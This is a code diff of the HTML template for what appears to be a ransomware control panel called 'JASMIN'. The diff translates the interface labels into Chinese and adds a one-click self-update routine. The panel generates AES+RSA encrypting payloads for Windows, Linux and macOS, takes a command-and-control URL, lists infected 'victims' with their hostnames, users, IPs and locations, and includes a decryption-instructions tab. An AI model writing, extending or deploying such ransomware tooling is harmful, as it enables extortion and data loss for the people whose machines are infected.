@@ -9,30 +9,30 @@
 <body>
 <nav class="sidebar" id="sidebar">
   <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
-  <a href="{{ url_for('dashboard') }}" class="nav-item active"><i class="fas fa-chart-pie"></i><span>Dashboard</span></a>
-  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>Payload Gen</span></a>
-  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>Victims</span></a>
-  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>Updates</span></a>
-  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>Decrypt</span></a>
+  <a href="{{ url_for('dashboard') }}" class="nav-item active"><i class="fas fa-chart-pie"></i><span>仪表盘</span></a>
+  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>载荷生成</span></a>
+  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>受害主机</span></a>
+  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>系统更新</span></a>
+  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>解密教程</span></a>
   <div class="sidebar-foot">
     <span class="user-badge"><i class="fas fa-user-shield"></i> {{ session.username }}</span>
-    <a href="{{ url_for('logout') }}"><i class="fas fa-sign-out-alt"></i> Logout</a>
+    <a href="{{ url_for('logout') }}"><i class="fas fa-sign-out-alt"></i> 退出</a>
   </div>
 </nav>
 <button class="hamburger" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>
 <main class="content">
 <section class="stats-row">
-  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num">{{ total }}</span><label>Infected</label></div></div>
-  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num">{{ total_pages }}</span><label>Pages</label></div></div>
-  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>Platforms</label></div></div>
+  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num">{{ total }}</span><label>已感染</label></div></div>
+  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num">{{ total_pages }}</span><label>页数</label></div></div>
+  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
 </section>
 
 <section class="panel" id="panel-gen">
-<h2><i class="fas fa-virus"></i> Payload Generator</h2>
+<h2><i class="fas fa-virus"></i> 载荷生成器</h2>
 <div class="gen-grid">
-  <div class="gen-card"><i class="fab fa-windows"></i><h3>Windows</h3><p>C# — AES+RSA</p><button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> Generate</button></div>
-  <div class="gen-card"><i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> Generate</button></div>
-  <div class="gen-card"><i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> Generate</button></div>
+  <div class="gen-card"><i class="fab fa-windows"></i><h3>Windows</h3><p>C# — AES+RSA</p><button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> 生成</button></div>
+  <div class="gen-card"><i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> 生成</button></div>
+  <div class="gen-card"><i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p><button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> 生成</button></div>
 </div>
 <div class="gen-opts">
   <div class="field"><label>C2 URL</label><input type="text" id="c2url" value="http://127.0.0.1:5000/handshake"></div>
@@ -44,14 +44,14 @@
 <section class="panel" id="panel-victims">
 <h2><i class="fas fa-desktop"></i> Victims</h2>
 <form action="{{ url_for('dashboard') }}" method="get" class="search-form">
-  <input type="text" name="search" placeholder="Search..." value="{{ search }}">
+  <input type="text" name="search" placeholder="搜索主机名、IP、系统..." value="{{ search }}">
   <button type="submit"><i class="fas fa-search"></i></button>
 </form>
 <div class="table-wrap"><table>
-<thead><tr><th>#</th><th>Machine</th><th>User</th><th>OS</th><th>IP</th><th>Location</th><th>Date</th><th>Time</th></tr></thead>
+<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>位置</th><th>日期</th><th>时间</th></tr></thead>
 <tbody>
 {% if not victims %}
-<tr><td colspan="8" class="empty">No victims found.</td></tr>
+<tr><td colspan="8" class="empty">暂无受害主机数据</td></tr>
 {% endif %}
 {% for v in victims %}
 <tr>
@@ -122,13 +122,19 @@ function checkUpdate(){
   var r=document.getElementById('update-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
   fetch('/update').then(x=>x.json()).then(d=>{
-    if(d.update){
-      var info=d.latest_commit?('最新提交: <b>'+d.latest_commit+'</b> — '+d.message):('最新版本: <b>'+d.latest+'</b>');
-      r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 有新版本<br>'+info+'</div>';
-    }else{
-      r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新 ('+d.current+')</div>';
-    }
+    if(!d.update){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 ('+d.current+')</div>';return;}
+    var info=d.latest_commit?('最新提交: <b>'+d.latest_commit+'</b> — '+d.message):('最新版本: <b>'+d.latest+'</b>');
+    r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 发现新版本<br>'+info
+      +'<br><br><button class="btn btn-red" onclick="doUpdate()"><i class="fas fa-download"></i> 一键更新</button></div>';
   }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
+}
+function doUpdate(){
+  var r=document.getElementById('update-result');
+  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
+  fetch('/do_update',{method:'POST'}).then(x=>x.json()).then(d=>{
+    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="/dashboard" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
+    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
+  }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
 }
 function showDT(t){
   document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
@@ -145,7 +151,7 @@ function showTab(t){
 function genPayload(p){
   var c2=document.getElementById('c2url').value,sec=document.getElementById('gensecret').value;
   var res=document.getElementById('gen-result');
-  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> Generating...</span>';
+  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成...</span>';
   var fd=new FormData();fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);
   fetch('/generate',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
     if(d.ok)res.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+d.platform+'</b>: <a href="/payloads/'+d.file+'" download>'+d.file+'</a> ('+d.size+' B)</div>';
